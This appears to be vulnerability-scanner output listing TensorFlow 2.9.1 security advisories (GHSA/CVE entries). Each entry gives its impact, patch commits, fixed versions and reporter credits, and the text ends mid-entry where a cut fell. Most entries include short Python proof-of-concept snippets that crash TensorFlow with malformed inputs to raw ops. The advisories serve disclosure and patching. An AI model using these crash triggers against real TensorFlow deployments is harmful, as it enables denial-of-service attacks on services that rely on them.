<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-tensorflow-2.9.1_5' / PIP's package 'tensorflow-2.9.1' is vulnerable:
    Id:        GHSA-mgmh-g2v6-mqw5
    Aliases:   ['CVE-2022-35941']
    Details:   ### Impact
The [`AvgPoolOp`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/avgpooling_op.cc#L56-L98) function takes an argument `ksize` that must be positive but is not checked. A negative `ksize` can trigger a `CHECK` failure and crash the program.
```python
import tensorflow as tf
import numpy as np

value = np.ones([1, 1, 1, 1])
ksize = [1, 1e20, 1, 1]
strides = [1, 1, 1, 1]
padding = 'SAME'
data_format = 'NHWC'

tf.raw_ops.AvgPool(value=value, ksize=ksize, strides=strides, padding=padding, data_format=data_format)
```

### Patches
We have patched the issue in GitHub commit [3a6ac52664c6c095aa2b114e742b0aa17fdce78f](https://github.com/tensorflow/tensorflow/commit/3a6ac52664c6c095aa2b114e742b0aa17fdce78f).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Jingyi Shi.

    Fixed in:  ['2.7.2', '2.8.1', '2.9.2']
    Link:      https://osv.dev/vulnerability/GHSA-mgmh-g2v6-mqw5
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-cqvq-fvhr-v6hc
    Aliases:   []
    Details:   ### Impact
Another instance of CVE-2022-35935, where `SobolSample` is vulnerable to a denial of service via assumed scalar inputs, was found and fixed.
```python
import tensorflow as tf
tf.raw_ops.SobolSample(dim=tf.constant([1,0]), num_results=tf.constant([1]), skip=tf.constant([1]))
```

### Patches
We have patched the issue in GitHub commits [c65c67f88ad770662e8f191269a907bf2b94b1bf](https://github.com/tensorflow/tensorflow/commit/c65c67f88ad770662e8f191269a907bf2b94b1bf) and [02400ea266bd811fc016a848445de1bbff3a23a0](https://github.com/tensorflow/tensorflow/commit/02400ea266bd811fc016a848445de1bbff3a23a0)

The fix will be included in TensorFlow 2.11. We will also cherrypick both commits on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range. TensorFlow 2.7.4 will have the first commit cherrypicked.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by:
- Kang Hong Jin from Singapore Management University
- Neophytos Christou, Secure Systems Labs, Brown University
- 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology
- Pattarakrit Rattankul

    Fixed in:  ['2.8.4', '2.9.3', '2.10.1']
    Link:      https://osv.dev/vulnerability/GHSA-cqvq-fvhr-v6hc
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-xf83-q765-xm6m
    Aliases:   []
    Details:   ### Impact
Another instance of CVE-2022-35991, where `TensorListScatter` and `TensorListScatterV2` crash via non scalar inputs in`element_shape`, was found in eager mode and fixed.
```python
import tensorflow as tf
arg_0=tf.random.uniform(shape=(2, 2, 2), dtype=tf.float16, maxval=None)
arg_1=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)
arg_2=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)
arg_3=''
tf.raw_ops.TensorListScatter(tensor=arg_0, indices=arg_1, 
element_shape=arg_2, name=arg_3)
```

### Patches
We have patched the issue in GitHub commit [bf9932fc907aff0e9e8cccf769e8b00d30fd81a1](https://github.com/tensorflow/tensorflow/commit/bf9932fc907aff0e9e8cccf769e8b00d30fd81a1).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Pattarakrit Rattankul

    Fixed in:  ['2.8.4', '2.9.3', '2.10.1']
    Link:      https://osv.dev/vulnerability/GHSA-xf83-q765-xm6m
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-66vq-54fq-6jvv
    Aliases:   ['CVE-2022-41891']
    Details:   ### Impact
If [`tf.raw_ops.TensorListConcat`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/list_kernels.h) is given `element_shape=[]`, it results segmentation fault which can be used to trigger a denial of service attack.
```python
import tensorflow as tf
tf.raw_ops.TensorListConcat(
    input_handle=tf.data.experimental.to_variant(tf.data.Dataset.from_tensor_slices([1, 2, 3])),
    element_dtype=tf.dtypes.float32,
    element_shape=[]
)
```

### Patches
We have patched the issue in GitHub commit [fc33f3dc4c14051a83eec6535b608abe1d355fde](https://github.com/tensorflow/tensorflow/commit/fc33f3dc4c14051a83eec6535b608abe1d355fde).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Tong Liu, ShanghaiTech University

    Fixed in:  ['2.8.4', '2.9.3', '2.10.1']
    Link:      https://osv.dev/vulnerability/GHSA-66vq-54fq-6jvv
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-67pf-62xr-q35m
    Aliases:   ['CVE-2022-41893']
    Details:   ### Impact
If [`tf.raw_ops.TensorListResize`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/list_kernels.cc) is given a nonscalar value for input `size`, it results `CHECK` fail which can be used to trigger a denial of service attack.
```python
import numpy as np
import tensorflow as tf

a = data_structures.tf_tensor_list_new(elements = tf.constant(value=[3, 4, 5]))
b = np.zeros([0, 2, 3, 3])

tf.raw_ops.TensorListResize(input_handle=a, size=b)
```

### Patches
We have patched the issue in GitHub commit [888e34b49009a4e734c27ab0c43b0b5102682c56](https://github.com/tensorflow/tensorflow/commit/888e34b49009a4e734c27ab0c43b0b5102682c56).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Pattarakrit Rattankul

    Fixed in:  ['2.8.4', '2.9.3', '2.10.1']
    Link:      https://osv.dev/vulnerability/GHSA-67pf-62xr-q35m
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-8fvv-46hw-vpg3
    Aliases:   ['CVE-2022-41887']
    Details:   ### Impact
[`tf.keras.losses.poisson`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/keras/losses.py) receives a `y_pred` and `y_true` that are passed through `functor::mul` in [`BinaryOp`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/cwise_ops_common.h). If the resulting dimensions overflow an `int32`, TensorFlow will crash due to a size mismatch during broadcast assignment.
```python
import numpy as np
import tensorflow as tf

true_value = tf.reshape(shape=[1, 2500000000], tensor = tf.zeros(dtype=tf.bool, shape=[50000, 50000]))
pred_value = np.array([[[-2]], [[8]]], dtype = np.float64)

tf.keras.losses.poisson(y_true=true_value,y_pred=pred_value)
```

### Patches
We have patched the issue in GitHub commit [c5b30379ba87cbe774b08ac50c1f6d36df4ebb7c](https://github.com/tensorflow/tensorflow/commit/c5b30379ba87cbe774b08ac50c1f6d36df4ebb7c).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1 and 2.9.3, as these are also affected and still in supported range. However, we will not cherrypick this commit into TensorFlow 2.8.x, as it depends on Eigen behavior that changed between 2.8 and 2.9.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Pattarakrit Rattankul.

    Fixed in:  ['2.9.3', '2.10.1']
    Link:      https://osv.dev/vulnerability/GHSA-8fvv-46hw-vpg3
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-6x99-gv2v-q76v
    Aliases:   ['CVE-2022-41888']
    Details:   ### Impact
When running on GPU, [`tf.image.generate_bounding_box_proposals`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/image/generate_box_proposals_op.cu.cc) receives a `scores` input that must be of rank 4 but is not checked.
```python
import tensorflow as tf

a = tf.constant(value=[[1.0, 1.0], [1.0, 1.0], [1.0, 1.0], [1.0, 1.0]])
b = tf.constant(value=[1])

tf.image.generate_bounding_box_proposals(scores=a,bbox_deltas=a,image_info=a,anchors=a,pre_nms_topn=b)
```

### Patches
We have patched the issue in GitHub commit [cf35502463a88ca7185a99daa7031df60b3c1c98](https://github.com/tensorflow/tensorflow/commit/cf35502463a88ca7185a99daa7031df60b3c1c98).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Pattarakrit Rattankul.

    Fixed in:  ['2.8.4', '2.9.3', '2.10.1']
    Link:      https://osv.dev/vulnerability/GHSA-6x99-gv2v-q76v
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-xxcj-rhqg-m46g
    Aliases:   ['CVE-2022-41889']
    Details:   ### Impact
If a list of quantized tensors is assigned to an attribute, the pywrap code fails to parse the tensor and returns a `nullptr`, which is not caught. An example can be seen in [`tf.compat.v1.extract_volume_patches`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/image/generate_box_proposals_op.cu.cc) by passing in quantized tensors as input `ksizes`.
```python
import numpy as np
import tensorflow as tf

a_input = np.array([1, -1], dtype= np.int32)
a_ksizes =  a_strides = tf.constant(dtype=tf.dtypes.qint16, value=[[1, 4], [5, 2]])


tf.compat.v1.extract_volume_patches(input=a_input,ksizes=a_ksizes,strides=a_strides,padding='VALID')
```

### Patches
We have patched the issue in GitHub commit [e9e95553e5411834d215e6770c81a83a3d0866ce](https://github.com/tensorflow/tensorflow/commit/e9e95553e5411834d215e6770c81a83a3d0866ce).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Pattarakrit Rattankul.

    Fixed in:  ['2.8.4', '2.9.3', '2.10.1']
    Link:      https://osv.dev/vulnerability/GHSA-xxcj-rhqg-m46g
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-54pp-c6pp-7fpx
    Aliases:   ['CVE-2022-41886']
    Details:   ### Impact
When [`tf.raw_ops.ImageProjectiveTransformV2`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/image/image_ops.cc) is given a large output shape, it overflows.
```python
import tensorflow as tf

interpolation = "BILINEAR"
fill_mode = "REFLECT"
images = tf.constant(0.184634328, shape=[2,5,8,3], dtype=tf.float32)
transforms = tf.constant(0.378575385, shape=[2,8], dtype=tf.float32)
output_shape = tf.constant([1879048192,1879048192], shape=[2], dtype=tf.int32)
tf.raw_ops.ImageProjectiveTransformV2(images=images, transforms=transforms, output_shape=output_shape, interpolation=interpolation, fill_mode=fill_mode)
```

### Patches
We have patched the issue in GitHub commit [8faa6ea692985dbe6ce10e1a3168e0bd60a723ba](https://github.com/tensorflow/tensorflow/commit/8faa6ea692985dbe6ce10e1a3168e0bd60a723ba).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou from the Secure Systems Lab (SSL) at Brown University.

    Fixed in:  ['2.8.4', '2.9.3', '2.10.1']
    Link:      https://osv.dev/vulnerability/GHSA-54pp-c6pp-7fpx
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-f2w8-jw48-fr7j
    Aliases:   ['CVE-2022-41897']
    Details:   ### Impact
If [`FractionMaxPoolGrad`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/fractional_max_pool_op.cc) is given outsize inputs `row_pooling_sequence` and `col_pooling_sequence`, TensorFlow will crash.

```python
import tensorflow as tf
tf.raw_ops.FractionMaxPoolGrad(
	orig_input = [[[[1, 1, 1, 1, 1]]]],
    orig_output = [[[[1, 1, 1]]]],
    out_backprop = [[[[3], [3], [6]]]],
    row_pooling_sequence = [-0x4000000, 1, 1], 
    col_pooling_sequence = [-0x4000000, 1, 1], 
    overlapping = False
 )
```

### Patches
We have patched the issue in GitHub commit [d71090c3e5ca325bdf4b02eb236cfb3ee823e927](https://github.com/tensorflow/tensorflow/commit/d71090c3e5ca325bdf4b02eb236cfb3ee823e927).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Vul AI.

    Fixed in:  ['2.8.4', '2.9.3', '2.10.1']
    Link:      https://osv.dev/vulnerability/GHSA-f2w8-jw48-fr7j
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-368v-7v32-52fx
    Aliases:   ['CVE-2022-41907']
    Details:   ### Impact
When [`tf.raw_ops.ResizeNearestNeighborGrad`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/image/resize_nearest_neighbor_op.cc) is given a large `size` input, it overflows.
```
import tensorflow as tf

align_corners = True
half_pixel_centers = False
grads = tf.constant(1, shape=[1,8,16,3], dtype=tf.float16)
size = tf.constant([1879048192,1879048192], shape=[2], dtype=tf.int32)
tf.raw_ops.ResizeNearestNeighborGrad(grads=grads, size=size, align_corners=align_corners, half_pixel_centers=half_pixel_centers)
```

### Patches
We have patched the issue in GitHub commit [00c821af032ba9e5f5fa3fe14690c8d28a657624](https://github.com/tensorflow/tensorflow/commit/00c821af032ba9e5f5fa3fe14690c8d28a657624).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou from the Secure Systems Lab (SSL) at Brown University.

    Fixed in:  ['2.8.4', '2.9.3', '2.10.1']
    Link:      https://osv.dev/vulnerability/GHSA-368v-7v32-52fx
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-rmg2-f698-wq35
    Aliases:   ['CVE-2022-41896']
    Details:   ### Impact
If [`ThreadUnsafeUnigramCandidateSampler`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/image/mirror_pad_op.cc) is given input `filterbank_channel_count` greater than the allowed max size, TensorFlow will crash.

```python
import tensorflow as tf
tf.raw_ops.Mfcc(
    spectrogram = [[[1.38, 6.32, 5.75, 9.51]]],
    sample_rate = 2,
    upper_frequency_limit = 5.0,
    lower_frequency_limit = 1.0,
    filterbank_channel_count = 2**31 - 1,
    dct_coefficient_count = 1
)
```

### Patches
We have patched the issue in GitHub commit [39ec7eaf1428e90c37787e5b3fbd68ebd3c48860](https://github.com/tensorflow/tensorflow/commit/39ec7eaf1428e90c37787e5b3fbd68ebd3c48860).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Vul AI.

    Fixed in:  ['2.8.4', '2.9.3', '2.10.1']
    Link:      https://osv.dev/vulnerability/GHSA-rmg2-f698-wq35
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-hq7g-wwwp-q46h
    Aliases:   ['CVE-2022-41898']
    Details:   ### Impact
If [`SparseFillEmptyRowsGrad`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/sparse_fill_empty_rows_op_gpu.cu.cc) is given empty inputs, TensorFlow will crash.

```python
import tensorflow as tf
tf.raw_ops.SparseFillEmptyRowsGrad(
    reverse_index_map=[], grad_values=[], name=None
)
```

### Patches
We have patched the issue in GitHub commit [af4a6a3c8b95022c351edae94560acc61253a1b8](https://github.com/tensorflow/tensorflow/commit/af4a6a3c8b95022c351edae94560acc61253a1b8).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Jiawei Liu, PhD student at University of Illinois, Urbana-Champaign.

    Fixed in:  ['2.8.4', '2.9.3', '2.10.1']
    Link:      https://osv.dev/vulnerability/GHSA-hq7g-wwwp-q46h
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-g9fm-r5mm-rf9f
    Aliases:   ['CVE-2022-41901']
    Details:   ### Impact
An input `sparse_matrix` that is not a matrix with a shape with rank 0 will trigger a `CHECK` fail in [`tf.raw_ops.SparseMatrixNNZ`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/sparse/sparse_matrix.h).

```python
import tensorflow as tf
tf.raw_ops.SparseMatrixNNZ(sparse_matrix=[])
```

### Patches
We have patched the issue in GitHub commit [f856d02e5322821aad155dad9b3acab1e9f5d693](https://github.com/tensorflow/tensorflow/commit/f856d02e5322821aad155dad9b3acab1e9f5d693).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Kang Hong Jin

    Fixed in:  ['2.8.4', '2.9.3', '2.10.1']
    Link:      https://osv.dev/vulnerability/GHSA-g9fm-r5mm-rf9f
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-cg88-rpvp-cjv5
    Aliases:   ['CVE-2022-41902']
    Details:   ### Impact
The function [MakeGrapplerFunctionItem](https://https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/grappler/utils/functions.cc#L221) takes arguments that determine the sizes of inputs and outputs. If the inputs given are greater than or equal to the sizes of the outputs, an out-of-bounds memory read or a crash is triggered.

### Patches
We have patched the issue in GitHub commit [a65411a1d69edfb16b25907ffb8f73556ce36bb7](https://github.com/tensorflow/tensorflow/commit/a65411a1d69edfb16b25907ffb8f73556ce36bb7).

The fix will be included in TensorFlow 2.11.0. We will also cherrypick this commit on TensorFlow 2.10.1.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

    Fixed in:  ['2.8.4', '2.9.3', '2.10.1']
    Link:      https://osv.dev/vulnerability/GHSA-cg88-rpvp-cjv5
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-pf36-r9c6-h97j
    Aliases:   ['CVE-2022-41911']
    Details:   ### Impact
When [printing a tensor](https://github.com/tensorflow/tensorflow/blob/807cae8a807960fd7ac2313cde73a11fc15e7942/tensorflow/core/framework/tensor.cc#L1200-L1227), we get it's data as a `const char*` array (since that's the underlying storage) and then we typecast it to the element type. However, conversions from `char` to `bool` are undefined if the `char` is not `0` or `1`, so sanitizers/fuzzers will crash.

### Patches
We have patched the issue in GitHub commit [1be743703279782a357adbf9b77dcb994fe8b508](https://github.com/tensorflow/tensorflow/commit/1be743703279782a357adbf9b77dcb994fe8b508).

The fix will be included in TensorFlow 2.11.0. We will also cherrypick this commit on TensorFlow 2.10.1, TensorFlow 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability was discovered via internal fuzzing.

    Fixed in:  ['2.8.4', '2.9.3', '2.10.1']
    Link:      https://osv.dev/vulnerability/GHSA-pf36-r9c6-h97j
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-rjx6-v474-2ch9
    Aliases:   ['CVE-2022-41909']
    Details:   ### Impact
An input `encoded` that is not a valid `CompositeTensorVariant` tensor will trigger a segfault in [`tf.raw_ops.CompositeTensorVariantToComponents`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/lib/core/py_func.cc).

```python
import tensorflow as tf

encode = tf.raw_ops.EmptyTensorList(element_dtype=tf.int32, element_shape=[10, 15], max_num_elements=2)
meta= ""
component=[tf.int32]

print(tf.raw_ops.CompositeTensorVariantToComponents(encoded=encode,metadata=meta,Tcomponents=component))
```

### Patches
We have patched the issue in GitHub commits [bf594d08d377dc6a3354d9fdb494b32d45f91971](https://github.com/tensorflow/tensorflow/commit/bf594d08d377dc6a3354d9fdb494b32d45f91971) and [660ce5a89eb6766834bdc303d2ab3902aef99d3d](https://github.com/tensorflow/tensorflow/commit/660ce5a89eb6766834bdc303d2ab3902aef99d3d).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by pattarakritr@smu.edu.sg

    Fixed in:  ['2.8.4', '2.9.3', '2.10.1']
    Link:      https://osv.dev/vulnerability/GHSA-rjx6-v474-2ch9
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-27rc-728f-x5w2
    Aliases:   ['CVE-2022-41899']
    Details:   ### Impact
Inputs `dense_features` or `example_state_data` not of rank 2 will trigger a `CHECK` fail in [`SdcaOptimizer`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/sdca_internal.cc).

```python
import tensorflow as tf

tf.raw_ops.SdcaOptimizer(
    sparse_example_indices=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.int64, maxval=100)],
    sparse_feature_indices=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.int64, maxval=100)],
    sparse_feature_values=8 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100)],
    dense_features=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100)],
    example_weights=tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100),
    example_labels=tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100),
    sparse_indices=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.int64, maxval=100)],
    sparse_weights=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100)],
    dense_weights=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100)],
    example_state_data=tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100),
    loss_type="squared_loss",
    l1=0.0,
    l2=0.0,
    num_loss_partitions=1,
    num_inner_iterations=1,
    adaptative=False,)
```

### Patches
We have patched the issue in GitHub commit [80ff197d03db2a70c6a111f97dcdacad1b0babfa](https://github.com/tensorflow/tensorflow/commit/80ff197d03db2a70c6a111f97dcdacad1b0babfa).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Zizhuang Deng of IIE, UCAS

    Fixed in:  ['2.8.4', '2.9.3', '2.10.1']
    Link:      https://osv.dev/vulnerability/GHSA-27rc-728f-x5w2
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-frqp-wp83-qggv
    Aliases:   ['CVE-2022-41910']
    Details:   ### Impact
The function [MakeGrapplerFunctionItem](https://https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/grappler/utils/functions.cc#L221) takes arguments that determine the sizes of inputs and outputs. If the inputs given are greater than or equal to the sizes of the outputs, an out-of-bounds memory read or a crash is triggered.
```python
import tensorflow as tf
@tf.function
def test():
    tf.raw_ops.QuantizeAndDequantizeV2(input=[2.5],
    								   input_min=[1.0],
    								   input_max=[10.0],
    								   signed_input=True,
    								   num_bits=1,
    								   range_given=True,
    								   round_mode='HALF_TO_EVEN',
    								   narrow_range=True,
    								   axis=0x7fffffff)
test()
```

### Patches
We have patched the issue in GitHub commit [7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb](https://github.com/tensorflow/tensorflow/commit/7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb).

The fix will be included in TensorFlow 2.11.0. We will also cherrypick this commit on TensorFlow 2.10.1.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

    Fixed in:  ['2.8.4', '2.9.3', '2.10.1']
    Link:      https://osv.dev/vulnerability/GHSA-frqp-wp83-qggv
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-gq2j-cr96-gvqx
    Aliases:   ['CVE-2022-41895']
    Details:   ### Impact
If [`MirrorPadGrad`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/image/mirror_pad_op.cc) is given outsize input `paddings`, TensorFlow will give a heap OOB error.

```python
import tensorflow as tf
tf.raw_ops.MirrorPadGrad(input=[1],
             paddings=[[0x77f00000,0xa000000]],
             mode = 'REFLECT')
```

### Patches
We have patched the issue in GitHub commit [717ca98d8c3bba348ff62281fdf38dcb5ea1ec92](https://github.com/tensorflow/tensorflow/commit/717ca98d8c3bba348ff62281fdf38dcb5ea1ec92).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Vul AI.

    Fixed in:  ['2.8.4', '2.9.3', '2.10.1']
    Link:      https://osv.dev/vulnerability/GHSA-gq2j-cr96-gvqx
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-xvwp-h6jv-7472
    Aliases:   ['CVE-2022-41900']
    Details:   ### Impact
An input `pooling_ratio` that is smaller than 1 will trigger a heap OOB in [`tf.raw_ops.FractionalMaxPool`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/fractional_max_pool_op.cc) and [`tf.raw_ops.FractionalAvgPool`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/fractional_avg_pool_op.cc).

### Patches
We have patched the issue in GitHub commit [216525144ee7c910296f5b05d214ca1327c9ce48](https://github.com/tensorflow/tensorflow/commit/216525144ee7c910296f5b05d214ca1327c9ce48).

The fix will be included in TensorFlow 2.11.0. We will also cherry pick this commit on TensorFlow 2.10.1.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

    Fixed in:  ['2.8.4', '2.9.3', '2.10.1']
    Link:      https://osv.dev/vulnerability/GHSA-xvwp-h6jv-7472
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-h246-cgh4-7475
    Aliases:   ['CVE-2022-41890']
    Details:   ### Impact
If [`BCast::ToShape`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/util/bcast.h) is given input larger than an `int32`, it will crash, despite being supposed to handle up to an `int64`. An example can be seen in [`tf.experimental.numpy.outer`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/util/bcast.h) by passing in large input to the input `b`.
```python
import tensorflow as tf
value = tf.constant(shape=[2, 1024, 1024, 1024], value=False)
tf.experimental.numpy.outer(a=6,b=value)
```

### Patches
We have patched the issue in GitHub commit [8310bf8dd188ff780e7fc53245058215a05bdbe5](https://github.com/tensorflow/tensorflow/commit/8310bf8dd188ff780e7fc53245058215a05bdbe5).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
